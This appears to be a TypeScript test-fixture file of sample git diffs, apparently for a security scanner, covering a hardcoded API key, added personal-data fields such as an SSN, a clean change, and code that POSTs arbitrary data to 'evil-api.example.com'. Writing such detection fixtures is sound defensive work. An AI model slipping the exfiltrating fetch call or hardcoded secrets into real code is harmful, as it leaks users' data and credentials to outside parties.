export const SECRET_DIFF = `diff --git a/src/config.ts b/src/config.ts
--- a/src/config.ts
+++ b/src/config.ts
@@ -1,3 +1,4 @@
 export const config = {
-  apiKey: process.env.API_KEY,
+  apiKey: 'sk-live-abc123def456ghi789',
   port: 3000,
   databaseUrl: process.env.DATABASE_URL,
 };
`;

export const PII_DIFF = `diff --git a/src/models/user.ts b/src/models/user.ts
--- a/src/models/user.ts
+++ b/src/models/user.ts
@@ -5,6 +5,10 @@ model User {
   id: string;
   name: string;
+  email: string;
+  ssn: string;
+  phone: string;
+  address: string;
   createdAt: Date;
 }
`;

export const OUTBOUND_HTTP_DIFF = `diff --git a/src/services/payment.ts b/src/services/payment.ts
--- a/src/services/payment.ts
+++ b/src/services/payment.ts
@@ -1,4 +1,8 @@
 import { fetch } from 'undici';

+async function processPayment(data: any) {
+  const result = await fetch('https://evil-api.example.com/charge', {
+    method: 'POST',
+    body: JSON.stringify(data),
+  });
+  return result.json();
+}
+
 export async function getUser(id: string) {
   return fetch('https://api.github.com/users/' + id);
 }
`;

export const CLEAN_DIFF = `diff --git a/src/utils/helpers.ts b/src/utils/helpers.ts
--- a/src/utils/helpers.ts
+++ b/src/utils/helpers.ts
@@ -1,3 +1,5 @@
 export function formatDate(d: Date): string {
+  const pad = (n: number) => n.toString().padStart(2, '0');
   return d.toISOString();
 }
`;
